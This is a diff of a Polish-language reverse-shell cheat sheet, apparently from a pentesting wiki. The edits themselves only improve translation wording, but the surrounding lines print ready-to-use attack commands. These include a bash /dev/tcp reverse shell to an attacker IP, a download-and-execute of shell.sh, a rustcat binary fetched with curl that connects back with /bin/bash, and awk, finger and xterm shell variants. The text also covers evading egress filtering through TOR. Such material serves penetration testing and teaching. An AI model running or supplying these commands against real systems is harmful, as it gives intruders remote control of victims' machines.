@@ -23,7 +23,7 @@ exec >&0
 ```
 Nie zapomnij sprawdzić z innymi powłokami: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
 
-### Symbol bezpiecznej powłoki
+### Symbol bezpieczna powłoka
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Kiedy mamy do czynienia z podatnością **Remote Code Execution (RCE)** w aplikacji webowej opartej na Linuksie, osiągnięcie reverse shell może być utrudnione przez zabezpieczenia sieciowe, takie jak reguły iptables lub skomplikowane mechanizmy filtrowania pakietów. W takich ograniczonych środowiskach alternatywne podejście polega na ustanowieniu powłoki PTY (Pseudo Terminal), aby skuteczniej interagować z zainfekowanym systemem.
+Kiedy mamy do czynienia z luką **Remote Code Execution (RCE)** w aplikacji webowej opartej na systemie Linux, osiągnięcie reverse shell może być utrudnione przez zabezpieczenia sieciowe, takie jak reguły iptables lub skomplikowane mechanizmy filtrowania pakietów. W takich ograniczonych środowiskach alternatywne podejście polega na ustanowieniu powłoki PTY (Pseudo Terminal), aby skuteczniej interagować z zainfekowanym systemem.
 
 Zalecanym narzędziem do tego celu jest [toboggan](https://github.com/n3rada/toboggan.git), które upraszcza interakcję z docelowym środowiskiem.
 
@@ -81,7 +81,7 @@ toboggan -m nix.py -i
 ```
 Aby bezpośrednio wykorzystać interaktywną powłokę. Możesz dodać `-b` dla integracji z Burpsuite i usunąć `-i` dla bardziej podstawowego opakowania rce.
 
-Inną możliwością jest użycie implementacji powłoki forward `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Inną możliwością jest użycie implementacji forward shell `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Musisz tylko zmodyfikować:
 
@@ -89,7 +89,7 @@ Musisz tylko zmodyfikować:
 - Prefiks i sufiks twojego ładunku (jeśli istnieje)
 - Sposób wysyłania ładunku (nagłówki? dane? dodatkowe informacje?)
 
-Następnie możesz po prostu **wysyłać polecenia** lub nawet **użyć polecenia `upgrade`**, aby uzyskać pełne PTY (zauważ, że potoki są odczytywane i zapisywane z przybliżonym opóźnieniem 1,3s).
+Następnie możesz po prostu **wysyłać polecenia** lub nawet **użyć polecenia `upgrade`**, aby uzyskać pełne PTY (zauważ, że potoki są odczytywane i zapisywane z opóźnieniem około 1,3 s).
 
 ## Netcat
 ```bash
@@ -236,7 +236,7 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 && chmod +x /tmp/rcat \
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
-Features:
+Funkcje:
 - Opcjonalny flag `--ssl` dla szyfrowanego transportu (TLS 1.3)
 - `-s` do uruchomienia dowolnego binarnego pliku (np. `/bin/sh`, `python3`) na ofierze
 - `--up` do automatycznego przejścia do w pełni interaktywnego PTY
@@ -259,7 +259,7 @@ Przydatne flagi:
 - `-p socks5://127.0.0.1:9050` : proxy przez TOR/HTTP/SOCKS
 - `-t` : utwórz interfejs TUN (reverse VPN)
 
-Ponieważ cała sesja jest szyfrowana i multiplikowana, często omija proste filtrowanie egress, które zabiłoby zwykły `/dev/tcp` shell.
+Ponieważ cała sesja jest szyfrowana i multiplikowana, często omija proste filtrowanie egress, które zabiłoby zwykły shell `/dev/tcp`.
 
 ## OpenSSL
 
@@ -297,7 +297,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```
 ## Finger
 
-**Atakujący**
+**Napastnik**
 ```bash
 while true; do nc -l 79; done
 ```
@@ -334,7 +334,7 @@ close(Service)
 ```
 ## Xterm
 
-To będzie próbować połączyć się z twoim systemem na porcie 6001:
+To spróbuje połączyć się z twoim systemem na porcie 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
@@ -347,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) UWAGA: Java reverse shell działa również dla Groovy
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) UWAGA: Odwrócona powłoka Java działa również dla Groovy
 ```bash
 String host="localhost";
 int port=8044;
